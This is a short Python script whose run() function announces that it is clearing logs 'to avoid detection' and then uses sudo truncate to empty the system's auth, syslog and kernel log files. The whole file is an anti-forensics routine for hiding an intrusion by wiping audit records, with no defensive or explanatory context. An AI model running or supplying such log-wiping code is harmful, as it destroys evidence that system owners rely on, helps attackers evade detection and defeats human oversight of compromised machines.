import os

def run():
    print("Clearing logs to avoid detection...")

    # Safer approach: clear logs instead of deleting everything
    log_files = [
        "/var/log/auth.log",
        "/var/log/syslog",
        "/var/log/kern.log"
    ]

    for log in log_files:
        if os.path.exists(log):
            os.system(f"sudo truncate -s 0 {log}")
            print(f"Cleared {log}")
        else:
            print(f"Log file {log} not found.")

    print("Log clearing complete.")
